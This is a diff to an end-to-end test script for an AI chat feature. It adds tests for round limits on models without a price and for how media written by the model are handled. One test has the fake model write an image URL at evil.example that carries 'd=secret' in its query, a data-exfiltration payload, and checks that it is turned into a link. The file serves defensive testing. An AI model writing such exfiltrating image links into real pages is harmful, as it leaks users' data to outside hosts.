@@ -4,7 +4,7 @@
  * provider, and scripted per test: the question's search, the model's search_pages and read_page
  * calls, the streamed answer and its citations; conversations (kept, continued with their history,
  * listed, shown, deleted, only ever to their owner, gone when the person leaves the workspace);
- * stopping an answer; the round limit, input and rate limits and a failing provider; the page
+ * stopping an answer; the turns of a model without a price, input and rate limits and a failing provider; the page
  * and teamspace scopes (kept with each question); the workspace switch and a server without AI; and access, checked on every tool call: a
  * private page shared with nobody, a private teamspace, a page shared with a group, a guest, another
  * workspace, and a page whose access is taken back between two questions. Also the model picked
@@ -12,7 +12,8 @@
  * question (their text in the prompt, images only to models that take them, only their owner may
  * open or attach them, deleted with the conversation), research mode (read-only tools, a plan, a
  * report saved as a page) and web search against a stand-in SearXNG server (the workspace's switch,
- * results as cited sources, a loopback page refused, changes asked about after reading the web).
+ * results as cited sources, a loopback page refused, changes asked about after reading the web), and
+ * media of another site the chat writes into a page written as links.
  * Creates its own users and workspaces and deletes them afterwards.
  *
  *   pnpm tsx scripts/ai-chat-e2e.ts
@@ -38,13 +39,13 @@ const { createGroup } = await import("@/server/groups");
 const { createTeamspace, joinTeamspace } = await import("@/server/teamspaces");
 const { removeMember, updateWorkspaceSettings } = await import("@/server/workspaces");
 const { AccessError } = await import("@/server/access");
-const { isAiError, promptRoomFor } = await import("@/server/ai");
+const { isAiError, promptRoomFor, RUN_ROUNDS } = await import("@/server/ai");
 const { resetAi, setAiEnv } = await import("@/server/ai/testing");
 const { startFakeOpenAi, textOf } = await import("@/server/ai/fake-openai");
 type FakeChatRequest = import("@/server/ai/fake-openai").FakeChatRequest;
 type FakeReply = import("@/server/ai/fake-openai").FakeReply;
 const index = await import("@/server/semantic-index");
-const { deleteConversations, getConversation, listConversations, MAX_ROUNDS, startChat } = await import("@/server/ai-chat");
+const { deleteConversations, getConversation, listConversations, startChat } = await import("@/server/ai-chat");
 const { setMemoryUse } = await import("@/server/ai-memory");
 const { decideChange } = await import("@/server/ai-chat-approvals");
 const { decidePageReview, getPageReview } = await import("@/server/page-review");
@@ -467,18 +468,23 @@ try {
   check(failed.error !== null && !failed.done, "a failing provider ends the answer with an error", failed.events);
   check((await listConversations(dave, workspaceId)).length === before, "…and leaves no empty conversation behind");
 
+  // The fake model has no price, so AI_RUN_LIMIT_USD never stops it: RUN_ROUNDS does. Its last turn
+  // only calls tools, so it's asked once more, and that text is the answer.
   let rounds = 0;
   fake.setChat(() => {
     rounds++;
-    return { text: rounds === MAX_ROUNDS ? "Enough: see [1]." : "", toolCalls: [{ name: "search_pages", arguments: { query: `tyres ${rounds}` } }] };
+    if (rounds > RUN_ROUNDS) return { text: "Done what I could: see [1]." };
+    return { text: "", toolCalls: [{ name: "search_pages", arguments: { query: `tyres ${rounds}` } }] };
   });
   fake.chats.length = 0;
-  const looping = await ask(dave, { workspaceId, message: "Search forever about tyres" });
-  check(looping.done && fake.chats.length === MAX_ROUNDS && looping.text === "Enough: see [1].", `a model that keeps calling tools gets ${MAX_ROUNDS} turns, the last one's text is the answer`, {
+  const looping = await ask(dave, { workspaceId, message: "Search forever about tyres, never answer" });
+  check(looping.done && fake.chats.length === RUN_ROUNDS + 1 && looping.text === "Done what I could: see [1].", `a model without a price gets ${RUN_ROUNDS} turns, then one more to answer when its last only calls tools`, {
     turns: fake.chats.length,
     text: looping.text,
+    error: looping.error,
   });
-  check(toolResults(fake.chats[MAX_ROUNDS - 1]).at(-1)?.includes("answer now"), "…and it's told to answer before its last turn");
+  check(toolResults(fake.chats[RUN_ROUNDS - 1]).at(-1)?.includes("answer now"), "…it's told to answer before its last turn");
+  check(toolResults(fake.chats[RUN_ROUNDS]).at(-1)?.includes("Not run"), "…and the last turn's tool calls aren't run");
 
   const room = await promptRoomFor(workspaceId);
   check((await refusal(() => startChat(dave, { workspaceId, message: "x".repeat(room + 1) }))) === "tooLarge", "a question longer than the model takes is refused");
@@ -843,6 +849,29 @@ try {
     toolResults(fake.chats.at(-1)!),
   );
 
+  // Media the model writes that would load another site become links; the page's own stay.
+  await service.replaceContent(checklist.id, "![Logo](https://cdn.example/logo.png)\n\n- Fit the tyres", { userId: alice });
+  fake.setChat(
+    caller([
+      write("edit_page", {
+        page_id: checklist.id,
+        edits: [{ op: "append", markdown: "![Leak](https://evil.example/p.png?d=secret)\n\n[Evil](https://evil.example/) <!-- leafdesk:bookmark -->\n\n![Logo again](https://cdn.example/logo.png)" }],
+      }),
+    ]),
+  );
+  const mediaWrite = await ask(alice, { workspaceId, message: "Add the chart", mode: "auto" });
+  const mediaBlocks = (await service.readBlocks(checklist.id)).blocks as { type: string; props?: { url?: string } }[];
+  const mediaBody = (await service.readPage(checklist.id)).markdown;
+  check(
+    mediaWrite.done &&
+      mediaBlocks.filter((b) => b.type === "image").map((b) => b.props?.url).join() === "https://cdn.example/logo.png,https://cdn.example/logo.png" &&
+      !mediaBlocks.some((b) => b.type === "bookmark") &&
+      mediaBody.includes("[Leak](https://evil.example/p.png?d=secret)") &&
+      mediaBody.includes("[Evil](https://evil.example/)"),
+    "an image or bookmark of another site the chat writes becomes a link; one the page already showed stays",
+    { types: mediaBlocks.map((b) => b.type), mediaBody },
+  );
+
   // What the person may not change.
   const sealed = await createPage(actor, { workspaceId, teamspaceId: null, kind: "database", title: "Sealed register" });
   await setPagePermission(owner, sealed.id, alice, "view");
@@ -928,6 +957,7 @@ try {
     setAiEnv(MODELS, { usage: ledger });
     const options = await chatOptionsFor(alice, workspaceId);
     check(options.models.map((m) => m.id).join() === "fake-chat,fake-big,fake-vision" && options.models.every((m) => !m.images), "the chat offers the main model and the others named, without images unless said", options);
+    check(options.models.every((m) => m.name === m.id), "a model the catalog doesn't know is shown by its id", options.models);
 
     fake.setChat(() => ({ text: "Big answer." }));
     fake.chats.length = 0;
